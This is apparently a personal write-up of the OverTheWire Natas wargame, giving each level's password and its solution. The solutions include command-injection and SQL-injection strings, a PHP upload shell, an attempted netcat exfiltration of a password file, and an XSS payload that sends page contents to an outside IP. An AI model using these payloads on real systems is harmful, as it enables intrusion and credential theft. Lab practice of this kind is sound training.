
Natas
=====

http://overthewire.org/wargames/natas/

Major takeaways:
- 

### natas0: natas0
View source.

### natas1: gtVrDuiDfck831PqWsLEZy5gyDz1clto
view-source:http://natas1.natas.labs.overthewire.org/

Right clicking disabled, download the source and have a look.

### natas2: ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi
http://natas2.natas.labs.overthewire.org/files/users.txt

Directory index on /files/

### natas3: sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14

"Not even Google will find it this time."

http://natas3.natas.labs.overthewire.org/robots.txt

### natas4: Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ

Setting the referer header.

```
$ curl --basic -u natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ http://natas4.natas.labs.overthewire.org/ --referer http://natas5.natas.labs.overthewire.org/
```

### natas5: iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq

Using -v means you can see the Set-Cookie header and see the loggedin=0 it's trying to send.

```
$ curl --basic -u natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq http://natas5.natas.labs.overthewire.org/ --cookie loggedin=1 -v
```

### natas6: aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1

The php source references a secret in /includes/secret.inc. 
When you run it through the form it tells you the password.

### natas7: 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9

PHP file inclusion bug.

```
http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
```

### natas8: DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe

Reverse the secret encoding function.

```
function decodeSecret($s) {
    return base64_decode(strrev(hex2bin($s)));
}
```

### natas9: W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl

You can do pretty much whatever you want with that grep command to capture output.

```
http://natas9.natas.labs.overthewire.org/?needle=.+%2Fetc%2Fnatas_webpass%2F*&submit=Search
```

### natas10: nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu

Same thing.  The filtering didn't affect the command I used.  Backticks would be fine too.

```
http://natas10.natas.labs.overthewire.org/?needle=.+%2Fetc%2Fnatas_webpass%2F*&submit=Search
```

### natas11: U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK

```
$m = "ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw\x3D";
echo "OriginalCookie: " . $m . "\n";
$match = base64_decode($m);

$encoded_struct = json_encode(array( "showpassword"=>"no", "bgcolor"=>"#ffffff" ));
echo "ENCODED " . $encoded_struct . "\n";
echo "MATCH " . $match . "\n";

$key = xor_encrypt($encoded_struct, $match);
$key = 'qw8J';
echo "@KEY@: " . $key . "\n";

$reencoded = xor_encrypt($match, $key);
echo "FOUND IN OLD: " . $reencoded . "\n";


// Let's encrypt again

$new_struct = json_encode(array( "showpassword"=>"yes", "bgcolor"=>"#ffffff" ));

$newtoken = xor_encrypt2($new_struct);
echo "@NEW@: " . base64_encode($newtoken) . "\n";
echo "what is here? " . xor_encrypt2($newtoken) . "\n";

$struct = json_decode(xor_encrypt2($newtoken), true);
var_dump($struct);
```

- Should have started by understanding the XOR plaintext attack.
- Trying to reverse characters here was probably not a good idea.
- Moving this to Python was probably a bad idea. Something with base64 being different.
- PHP is wet garbage. Need to find a function to display binary data better.
- Remember to re-state your assumptions.  The key repeated every 4 characters, but ended before
  a complete revolution.  I should have looked at the key, copied out the 4 repeating characters
  and used that, rather than doubling up the key and having the last chunk be incorrect.  Tough
  to track down.

### natas12: EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3

- In developer tools, change the filename to hello.php.
- That pathinfo() function uses the same file extension and doesn't filter for jpg/jpeg.
- Then it runs whatever .php files are sitting there.
```
<?php

echo "hello from me\n";

system("cat /etc/natas_webpass/*");

?>
```

### natas13: jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY

- Same idea as the last one.  But it'll run exif\_imagetype() on it, so you need to have 
  enough of a JPEG file at the top to trick php, but if you add that .php file extension
  in the form, it'll run it as php again anyway.

### natas14: Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1

```
$ curl --basic -u natas14:Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1 http://natas14.natas.labs.overthewire.org?debug=yes -F username='" or 1#' -F password=abc123
```

### natas15: AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J

I made an educated guess that the user is natas16 and verified it exists.
We can inject some SQL, but we can't get output - we only know if a row was returned or not.
I wrote a script to start trying strings and see if there exists a password that starts with 
that string. If there is, start trying more characters on the end of that string. 

Didn't realize LIKE was case-insensitive. Great. :tada:

### natas16: WaIHEacj63wnNIBROHeqi3p9t0m5nhmh 

``` 
passthru("grep -i \"$key\" dictionary.txt"); 
```

Okay, so it's filtering things out when we run the grep command. So how do we get some output
out of this thing?  It's tough to break out of the quotes.  But we can run a subcommand, so 
there's a lot we can do.
 - Tried using `nc -l 0.0.0.0 12345` but the host doesn't accept connections.  It does hang, so netcat exists.
 - Tried using `nc server.com 12345 < /etc/natas_webpass/natas17` but it doesn't make outgoing connections.
 - Tried using `.$(echo -e \\042) /etc/natas*/* $(echo -e \\042)` to emit quotes, but it fails for some reason.

Okay, if I pull the first char of the file in the subcommand, whatever it greps out will tell me the character
it starts with at any rate.  I wonder if there are dictionary entries with numbers.  I think I can write 
something to work with isupper as well.  It seemed like a reasonable solution, and these gaps heavily reduce
the brute force space, but I'd really like to get the exact data pulled out.

Usually I'd do something like `grep ^something file && echo found` or something, but pipe is filtered out,
so I had to look at other ways.  Whatever subcommand you run still needs to be incorporated into a valid 
grep command that'll go through the dictionary file.  What I settled on was `hello$(grep -l ^%s /etc/natas_webpass/natas17)`
So if the string is in the file, it'll try to grep for hello/etc/nataswebpass/natas17 and won't find anything.
If the string isn't in the file, it'll grep for hello in the dictionary.  Using that I could basically
reuse the script from the last exercise to brute force the contents of the password file out.

### natas17: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw

And that'll be a totally blind SQL injection.  Well I think I can reuse 15 pretty much completely.

```
select sleep(3) from users where username = "natas18" and password LIKE BINARY "~~"
```

Took a little while to figure out where the sleep would go. A subquery seems like the standard place.
God damn, it's amazing how much a person can do with a database connection. Amazing that by default 
everything is completely open - with that query you could dump the schema and everything in the database,
slowly, if you had enough time.

### natas18: xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP

First step, clean up the PHP a little bit so you can see what's going on.
So it looks like there's no way to enter anything that would make you an admin. But the PHPSESSID is 
a number from 1-640, so I wrote a for loop to try them all and see if I could hijack an admin's session.
Unfortunately the script didn't kick out the PHPSESSID that was correct, but that's ok.

```
$ for i in `seq 640`; do echo trying $i >&2; echo trying $i; curl --basic -u natas$LEVEL:$PASS http://natas$LEVEL.natas.labs.overthewire.org/index.php?debug=yes --cookie PHPSESSID=$i; done > out
```

### natas19: 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs

Looks like the same kind of thing here.  But these PHPSESSIDs are weird.  It's like the session id 
is a function of the username and password.  If you parse each two characters of PHPSESSID, you get
a number-username string.  Tried enumerating the %d-natas20 session IDs, but nothing came up.  Most of
them had a regular user assigned, which would be the case if other people were doing this and guessing
natas20 like I did.  I tried enumerating %d-admin, and that kicked out the password.  I think I'm
overtired though, as this took me way longer than it probably should have.

Funky buffering issues with Python and the subprocess module.  When I want to pipe the whole program
input out to `tee` the python program's input hangs for like 60s before being emitted at once.  And 
that's with `python -u` for what I thought was unbuffered input.  Too many pipes?

### natas20: eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF

This looks like reading through a bunch of PHP, which means I'm done for tonight.
Looks like you're trying to get it to read from an existing file which has admin=1 set. 
Not sure where those session ids come from, it seems like you need to be able to influence 
that to start reading from the filesystem.

Nope, looks like XSS. Chrome has (helpfully?) blocked this XSS attempt. Which is cool, but not
exactly what I want right now. First thought is to add a script that sends document.cookie off to
a webserver I've set up somewhere else so I can hijack other people's sessions. Hopefully an 
admin would do that and I could log in as them and see the password for the next level. But that'd
need some kind of background job pulling the page as an admin regularly, and I'd need to set up
a webserver somewhere to harvest the session identifiers.

And it looks like the HttpOnly parameter is set on the cookie, so I can't get at it with Javascript.
But I guess if the admin is logged in, the Password is displayed on the page, so I guess I could 
have the document.innerHTML sent off somewhere. Again, though, there would have to be a background
job running pulling down the admin page all the time.

I got it to the point where the XSS is sending the page content off to a webserver of my choice.
But the admin needs to view this page to get it to work. I think my approach is off. There needs to
be some report that the admin will run to view everyone's names.  You'd need to get the admin to
read the file using your session, which I guess you could do by mailing them a link with PHPSESSID
set in the GET parameters.

```
[08/Apr/2019 22:43:09] "GET /?poop=%0A%3Ch1%3Enatas20%3C/h1%3E%0A%3Cdiv%20id%3D%22content%22%3E%0AYou%20are%20logged%20in%20as%20a%20regular%20user.%20Login%20as%20an%20admin%20to%20retrieve%20credentials%20for%20natas21.%0A%3Cform%20action%3D%22index.php%22%20method%3D%22POST%22%3E%0AYour%20name%3A%20%3Cinput%20name%3D%22name%22%20value%3D%22%22%3E%3Cscript%3Enew%20Image%28%29.src%3D%22http%3A//35.229.49.155%3Fpoop%3D%22%20+%20escape%28document.body.innerHTML%29%3B%3C/script%3E%3C/form%3E%3C/div%3E/ HTTP/1.1" 200 -
```

Alos, It doesn't seem right that I should try enumerating a ton of sessions.  The session names are 
generated with `session_start()` and they change like crazy, so there would be too many.

I wonder if the problem is with that serialization algorithm, and being able to break out of
the session storage and read `/etc/natas_webpass/*` and start pulling out passwords that way.
Trying to send a new `PHPSESSID=abc` means you read from `/var/lib/php5/sessions/mysess_abc`.  It
masks out any non alnum chars or dash. So it doesn't look like you can read or write from any 
location on the filesystem, which is what we want.

Ahem, after a quick look at someone else's thoughts on the matter, it looks like that session
algorithm is the way to go. The key is hiding extra information inside the session file, namely
the admin=1 parameter.  So if you can hide a newline in the name parameter, you can sneak a second
key into that session dictionary that'll get read out the next time the page gets loaded.

```
$ curl --basic -u natas20:eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF natas20.natas.labs.over/index.php?debug=yes --cookie PHPSESSID=p1dvr1e7vhirhmfsiehp59tg67 -F $'name=abc123\nadmin 1' -v
```

I should have spent more time auditing that session code, as it was the biggest piece
of information I had to go with.  I guess that reflects how much I like reading PHP.  On the 
face of it, the code looked okay, but I should have dug in harder.

### natas21: IFekPyrQXftziDEsUr3x21sYuahypdgJ
 
Looks like both sites share the same session backend. Filesystem probably. With that CSS page
it looks like you can inject admin=1 by editing the form, and if you send the 2nd site's PHPSESSID
to the site that'll display admin, it should pull it.  But it didn't.  Will try again tomorrow.
Rather than these manual steps in the browser I'll set up a script.



